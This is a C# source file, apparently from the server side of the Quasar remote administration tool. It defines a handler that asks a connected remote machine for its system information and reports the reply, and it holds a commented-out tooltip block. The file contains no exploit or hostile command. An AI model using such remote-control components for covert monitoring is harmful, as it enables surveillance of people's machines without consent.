﻿using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程系统信息交互的消息。
    /// </summary>
    public class SystemInformationHandler : MessageProcessorBase<List<Tuple<string, string>>>
    {
        /// <summary>
        /// 与此系统信息处理器关联的客户端。
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// 使用给定客户端初始化 <see cref="SystemInformationHandler"/> 类的新实例。
        /// </summary>
        /// <param name="client">关联的客户端。</param>
        public SystemInformationHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetSystemInfoResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender client) => _client.Equals(client);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetSystemInfoResponse info:
                    Execute(sender, info);
                    break;
            }
        }

        /// <summary>
        /// 刷新客户端的系统信息。
        /// </summary>
        public void RefreshSystemInformation()
        {
            _client.Send(new GetSystemInfo());
        }

        private void Execute(ISender client, GetSystemInfoResponse message)
        {
            OnReport(message.SystemInfos);

            // TODO: Refactor tooltip
            //if (Settings.ShowToolTip)
            //{
            //    var builder = new StringBuilder();
            //    for (int i = 0; i < packet.SystemInfos.Length; i += 2)
            //    {
            //        if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
            //        {
            //            builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
            //        }
            //    }

            //    FrmMain.Instance.SetToolTipText(client, builder.ToString());
            //}
        }
    }
}
